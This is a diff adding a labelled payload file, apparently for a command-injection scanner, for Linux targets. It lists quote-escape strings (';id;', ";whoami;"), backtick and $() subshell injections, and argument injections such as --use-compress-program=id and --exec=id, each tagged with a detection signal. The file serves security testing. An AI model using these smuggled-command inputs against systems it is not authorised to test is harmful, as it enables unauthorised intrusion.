@@ -1,0 +1,36 @@
+# @default_os:     linux
+# @default_signal: system:linux_id
+# @default_blind:  false
+# @default_tier:   1
+#
+# Quote-context and argument injection escapes.
+
+# @label: Single-quote escape id
+';id;'
+
+# @label: Double-quote escape id
+";id;"
+
+# @label: Quote-escape whoami
+# @signal: system:linux_user
+';whoami;'
+
+# @label: DQ-escape whoami
+# @signal: system:linux_user
+";whoami;"
+
+# @label: Mid-value backtick id
+x`id`y
+
+# @label: Mid-value subshell id
+x$(id)y
+
+# @label: Tar flag inject id
+# @signal: system:linux_id
+--use-compress-program=id
+
+# @label: Arg inject --exec
+--exec=id
+
+# @label: Arg inject -e flag
+-e id
